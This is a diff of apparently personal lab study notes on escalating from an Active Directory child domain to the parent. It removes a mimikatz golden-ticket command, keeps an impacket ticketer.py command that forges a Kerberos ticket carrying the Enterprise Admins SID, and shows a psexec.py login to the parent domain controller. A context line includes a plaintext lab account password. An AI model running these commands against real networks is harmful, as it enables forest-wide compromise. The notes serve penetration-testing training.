@@ -56,11 +56,7 @@ lookupsid.py 'logistics.inlanefreight.local/htb-student_adm:HTB_@cademy_stdnt_ad
 - The SID of the Enterprise Admins group of the root domain: `S-1-5-21-3842939050-3880317879-2865463114-519`
 #### Construct the Golden Ticket
 
-
-kerberos::golden /user:hacker /domain:<Our_current_child_domain> /sid:<sid_of_child_domain> /krbtgt:<krbtgt_NTLM_hash> /sids:<sid_of_enterprise_admins_group> /ptt
-
-
-```
+```bash
 ticketer.py -nthash <krbtgt_NTLM_hash> -domain <Our_current_child_domain> -domain-sid <sid_of_child_domain> -extra-sid <sid_of_enterprise_admins_group> hacker
 ```
 
@@ -105,7 +101,6 @@ Log into the `Parent` DC:
 ```bash
 psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
 ```
-
 ### raiseChild.py
 
 All of the above can be done with this:
